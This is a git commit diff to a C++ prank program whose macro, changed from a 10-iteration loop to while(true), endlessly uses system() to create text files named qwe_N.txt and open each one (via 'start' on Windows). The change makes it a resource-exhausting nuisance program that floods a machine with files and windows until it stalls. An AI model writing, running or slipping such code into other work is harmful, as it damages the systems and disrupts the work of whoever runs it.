ddb8e1ca8badcfbb75f7bc335a969e42d515cb43
Cryptofun.jr <61570493+Argsssssss@users.noreply.github.com>
2026-03-17 10:32:26 +0700

    Update ULYLYLYLY_create&open_on_while_true.cpp

--- ULYLYLYLY_create&open_on_while_true.cpp
+++ ULYLYLYLY_create&open_on_while_true.cpp
@@ -1,7 +1,7 @@
 #include <iostream>
 using namespace std;
 
-#define mem(open_file){int i = 0;while(i < 10){string create = "echo ULYLYLYLYLYLYLYLYLYLYLYLYLYLYLYLYYLYLYYLYLYLLYYLYLYLYLYLY > qwe_", BUFF = open_file;create += to_string(i) + ".txt";open_file += to_string(i) + ".txt";const char* com_create = create.c_str();const char* com_open = open_file.c_str();system(com_create);system(com_open);open_file = BUFF;i++;clear();}}
+#define mem(open_file){int i = 0;while(true){string create = "echo ULYLYLYLYLYLYLYLYLYLYLYLYLYLYLYLYYLYLYYLYLYLLYYLYLYLYLYLY > qwe_", BUFF = open_file;create += to_string(i) + ".txt";open_file += to_string(i) + ".txt";const char* com_create = create.c_str();const char* com_open = open_file.c_str();system(com_create);system(com_open);open_file = BUFF;i++;clear();}}
 
 #if defined(_WIN32) || defined (_WIN64)
     string open_file = "start qwe_";
